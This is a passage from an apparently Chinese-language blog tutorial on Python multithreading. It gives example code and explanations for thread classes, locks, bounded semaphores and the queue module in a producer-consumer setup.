operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行结果如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200408205329302.png" alt="" loading="lazy"></p><p>当然以上也可以创建多个线程，下面使用可调用的类来实现：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime<span class="token punctuation">,</span> sleeploops <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">class</span> <span class="token class-name">ThreadFunc</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> func<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>func <span class="token operator">=</span> func        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">#重写run方法,定义线程功能</span>        self<span class="token punctuation">.</span>func<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">loop</span><span class="token punctuation">(</span>nloop<span class="token punctuation">,</span> nsec<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'start loop'</span><span class="token punctuation">,</span> nloop<span class="token punctuation">,</span> <span class="token string">'at :'</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span>nsec<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'loop'</span><span class="token punctuation">,</span> nloop<span class="token punctuation">,</span> <span class="token string">'done at :'</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'starting at :'</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    nloops <span class="token operator">=</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>        t <span class="token operator">=</span> ThreadFunc<span class="token punctuation">(</span>loop<span class="token punctuation">,</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> loops<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'all DONE at :'</span><span class="token punctuation">,</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>效果和上面的一样，随后我们将其功能存储为一个独立的模块（myThread.py）：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime<span class="token keyword">class</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>func<span class="token punctuation">,</span>args<span class="token punctuation">,</span>name <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>func <span class="token operator">=</span> func        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args    <span class="token keyword">def</span> <span class="token function">getResult</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>res  <span class="token comment" spellcheck="true">#将结果保存后通过getResult方法获取返回值</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"starting"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>res <span class="token operator">=</span> self<span class="token punctuation">.</span>func<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"finished at :"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="斐波那契，阶乘与累加"><a href="#斐波那契，阶乘与累加" class="headerlink" title="斐波那契，阶乘与累加"></a>斐波那契，阶乘与累加</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> myThread <span class="token keyword">import</span> MyThread<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime<span class="token punctuation">,</span> sleep<span class="token keyword">def</span> <span class="token function">Fib</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    sleep<span class="token punctuation">(</span><span class="token number">0.005</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> x <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>Fib<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> Fib<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Fac</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> x <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>x <span class="token operator">*</span> Fac<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Sum</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> x <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>x <span class="token operator">+</span> Sum<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>funcs <span class="token operator">=</span> <span class="token punctuation">[</span>Fib<span class="token punctuation">,</span> Fac<span class="token punctuation">,</span> Sum<span class="token punctuation">]</span>n <span class="token operator">=</span> <span class="token number">8</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    nfuncs <span class="token operator">=</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>funcs<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"starting"</span><span class="token punctuation">,</span> funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__name__<span class="token punctuation">,</span> <span class="token string">"at :"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__name__<span class="token punctuation">,</span> <span class="token string">"finished at :"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n *** MULTIPLE THREADS"</span><span class="token punctuation">)</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>        t <span class="token operator">=</span> MyThread<span class="token punctuation">(</span>funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> funcs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nfuncs<span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>getResult<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all DONE"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行结果如下，可见多线程处理的效果</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410104130911.png" alt="" loading="lazy"></p><h3 id="锁示例"><a href="#锁示例" class="headerlink" title="锁示例"></a>锁示例</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> atexit <span class="token keyword">import</span> register<span class="token keyword">from</span> random <span class="token keyword">import</span> randrange<span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread <span class="token punctuation">,</span> Lock<span class="token punctuation">,</span> current_thread<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime<span class="token punctuation">,</span> sleep<span class="token keyword">class</span> <span class="token class-name">CleanOutputSet</span><span class="token punctuation">(</span>set<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#当使用print输出对象的时候，若定义了__str__(self)方法，打印对象时就会从这个方法中打印出return的字符串数据</span>        <span class="token keyword">return</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> self<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#表示将self中每个元素（除最后一个）后加上, 分离形成字符串后返回</span>lock <span class="token operator">=</span> Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#创建一个锁对象</span>loops <span class="token operator">=</span> <span class="token punctuation">(</span>randrange<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span>randrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#此行表示随机选取2-5的数字随机选3-7次</span>remaining <span class="token operator">=</span> CleanOutputSet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">loop</span><span class="token punctuation">(</span>nsec<span class="token punctuation">)</span><span class="token punctuation">:</span>    myname <span class="token operator">=</span> current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name  <span class="token comment" spellcheck="true">#返回当前Thread对象的名字</span>    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">#加锁</span>    remaining<span class="token punctuation">.</span>add<span class="token punctuation">(</span>myname<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#add方法，如果不在集合中则添加</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[{}] Started {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>myname<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print("    (remaining: {})".format(remaining or "NONE"))</span>    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">#释放</span>    sleep<span class="token punctuation">(</span>nsec<span class="token punctuation">)</span>    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>    remaining<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>myname<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[{}] Competed {} ({} secs)"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>myname<span class="token punctuation">,</span>nsec<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"    (remaining: {})"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>remaining <span class="token operator">or</span> <span class="token string">"NONE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> pause <span class="token keyword">in</span> loops<span class="token punctuation">:</span>        Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>loop<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>pause<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>@register   <span class="token comment" spellcheck="true">#通过装饰器使用register,atexit模块使用register函数用于在 python 解释器中注册一个退出函数，这个函数在解释器正常终止时自动执行</span><span class="token keyword">def</span> <span class="token function">_atexit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all DONE at :{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>输出结果之一如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200410215119133.png" alt="" loading="lazy"></p><p>I/O和访问相同的数据结构都属于临界区，因此需要多个锁来防止多个线程同时进入临界区</p><h3 id="信号量示例"><a href="#信号量示例" class="headerlink" title="信号量示例"></a>信号量示例</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> atexit <span class="token keyword">import</span> register<span class="token keyword">from</span> random <span class="token keyword">import</span> randrange<span class="token keyword">from</span> threading <span class="token keyword">import</span> BoundedSemaphore<span class="token punctuation">,</span> Lock<span class="token punctuation">,</span> Thread<span class="token keyword">from</span> time <span class="token keyword">import</span> ctime<span class="token punctuation">,</span> sleeplock <span class="token operator">=</span> Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>MAX <span class="token operator">=</span> <span class="token number">5</span>candytray <span class="token operator">=</span> BoundedSemaphore<span class="token punctuation">(</span>MAX<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">refill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Refilling candy..."</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        candytray<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#释放信号量，使内部计数器增加一，可以唤醒等待的线程</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"full, skipping"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"OK  "</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Remaining :{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>candytray<span class="token punctuation">.</span>_value<span class="token punctuation">)</span><span class="token punctuation">)</span>    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Buying candy..."</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> candytray<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true"># 获取一个信号量，如果内部计数器大于零，则将其减一并立即返回True。如果为零，返回False</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"OK  "</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Remaining :{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>candytray<span class="token punctuation">.</span>_value<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"empty, skipping"</span><span class="token punctuation">)</span>    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">producer</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>        refill<span class="token punctuation">(</span><span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span>randrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">consumer</span><span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>        buy<span class="token punctuation">(</span><span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span>randrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"starting at :{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    nloops <span class="token operator">=</span> randrange<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"THE CANDY MACHINE (full with {})!"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>MAX<span class="token punctuation">)</span><span class="token punctuation">)</span>    Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>consumer<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>randrange<span class="token punctuation">(</span>nloops<span class="token punctuation">,</span> nloops <span class="token operator">+</span> MAX <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>producer<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>nloops<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>@register<span class="token keyword">def</span> <span class="token function">_atexit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all DONE at :{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><code>acquire(blocking=布尔值,timeout=None)</code></p><ul><li>本方法用于获得Semaphore</li><li>blocking默认值是True，此时，如果内部计数器值大于0，则减一，并返回；如果等于0，则阻塞，等待其他线程调用release()以使计数器加1；本方法返回True，或无线阻塞</li><li>如果blocking=False,则不阻塞，如若获取失败，则返回False</li><li>当设定了timeout的值，最多阻塞timeout秒，如果超时，返回False。</li></ul><p><code>release()</code></p><ul><li>释放Semaphore，内部计数器加1，可以唤醒等待的线程</li></ul><p>结果之一如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/image-20200411110201154.png" alt="" loading="lazy"></p><h3 id="生产者，消费者-多线程"><a href="#生产者，消费者-多线程" class="headerlink" title="生产者，消费者(多线程)"></a>生产者，消费者(多线程)</h3><p><strong>queue模块</strong></p><p><strong>类</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Queue(maxsize=0)</td><td align="center">创建一个先入先出的队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td></tr><tr><td align="center">LifoQueue(maxsize=0)</td><td align="center">创建一个后入先出的队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td></tr><tr><td align="center">PriorityQueue(maxsize=0)</td><td align="center">创建一个优先级队列，如果给定最大值，则在队列没有空间时阻塞，否则（未指定最大值），为无限队列</td></tr></tbody></table><p><strong>异常</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Empty</td><td align="center">当对空队列调用get*()方法时抛出异常</td></tr><tr><td align="center">Full</td><td align="center">当对已满的队列调用put*()方法时抛出异常</td></tr></tbody></table><p><strong>方法</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">qsize()</td><td align="center">返回队列大小(由于返回时队列大小可能被其它线程修改m，所以该值为近似值)</td></tr><tr><td align="center">empty()</td><td align="center">如果队列为空，则返回True，否则返回False</td></tr><tr><td align="center">full()</td><td align="center">如果队列已满，则返回True，否则返回False</td></tr><tr><td align="center">put(item,block=True,timeout=None)</td><td align="center">将item放入队列，如果block为True（默认），且timeout为None，则在有可用空间之前阻塞，如果timeout为正值，则最多阻塞timeout秒，如果block为False，则抛出Empty异常</td></tr><tr><td align="center">put_nowait(item)</td><td align="center">和put(item,Flase)相同</td></tr><tr><td align="center">get(block=True,timeout-None)</td><td align="center">从队列中取得元素，如果给定了block（非0），则一直阻塞到有可用的元素为止</td></tr><tr><td align="center">get_nowait()</td><td align="center">和get(False)相同</td></tr><tr><td align="center">task_done()</td><td align="center">用于表示队列中的某个元素已执完成，该方法会被下面的join()使用</td></tr><tr><td align="center">join()</td><td align="center">在队列中所有元素执行完毕并调用上面的task_done()信号之前，保持阻塞</td></tr></tbody></table><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">from</span> queue <span class="token keyword">import</span> Queue<span class="token keyword">from</span> myThread <span class="token keyword">import</span> MyThread<span class="token keyword">def</span> <span class="token function">writeQ</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">:</span>    queue<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"producing object for Q... "</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"size now "</span><span class="token punctuation">,</span>queue<span class="token punctuation">.</span>qsize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">randQ</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">:</span>    val <span class="token operator">=</span> queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"consumed object from Q... size now "</span><span class="token punctuation">,</span> queue<span class="token punctuation">.</span>qsize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">writer</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> loops<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true">#写数据入队列</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>        writeQ<span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">reader</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> loops<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true">#从队列中取出数据</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">:</span>        randQ<span class="token punctuation">(</span>queue<span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#添加延时便于观察</span>funcs <span class="token operator">=</span> <span class="token punctuation">[</span>reader<span class="token punctuation">,</span> writer<span class="token punctuation">]</span>nfuncs <span class="token operator">=</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>funcs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> 